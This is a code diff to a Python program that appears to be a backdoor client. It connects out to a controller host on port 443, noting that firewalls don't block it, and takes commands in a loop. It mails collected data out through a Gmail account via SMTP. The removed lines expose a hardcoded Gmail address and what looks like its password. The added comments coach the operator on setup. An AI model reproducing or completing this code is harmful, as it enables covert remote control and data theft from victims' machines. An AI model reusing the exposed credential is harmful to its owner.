@@ -6,8 +6,8 @@ import smtplib
 import base64
 import os
 import platform
-clientHOST = "192.168.1.199"
-clientPORT = 443
+clientHOST = "<Host IP Address(Yours, Most Likely)"
+clientPORT = 443 # You can either change or leave the client port like it is, recommened port: 443, why? Firewalls don't block 443 (HTTPS).
 BUFFER_SIZE = 1024
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((clientHOST, clientPORT))
@@ -31,10 +31,11 @@ while True:
         os.remove(file)
         smtp = smtplib.SMTP('smtp.gmail.com', 587)
         smtp.starttls()
-        smtp.login("hydrostrafeyt@gmail.com", "Sigalfunes0587072344#Itay%")
+        smtp.login("YOUREMAIL@gmail.com", "YOUR GMAIL PASSWORD") # Only Gmail accounts will work, don't try something else like ProtonMail, make sure you open a new Gmail account and allow less secure apps
         message = data
-        smtp.sendmail("hydrostrafeyt@gmail.com", "hydrostrafeyt@gmail.com", message)
+        smtp.sendmail("SENDER_EMAIL@gmail.com", "YOUREMAIL@gmail.com", message) # Sender email doesn't really matter here, you can just type something that you'll remember, or you can be a normal guy and just type your email address instead :)
         smtp.quit()
-    #elif Handler_DATA == "ipconfig":
-        #if platform.system() == "Windows":
+    #elif Handler_DATA == "ipconfig": # NEEDS TO BE FINISHED UNIL 8/7/2021
+        #if platform.system() == "Windows": # NEEDS TO BE FINISHED UNIL 8/7/2021
+        ## pass
             
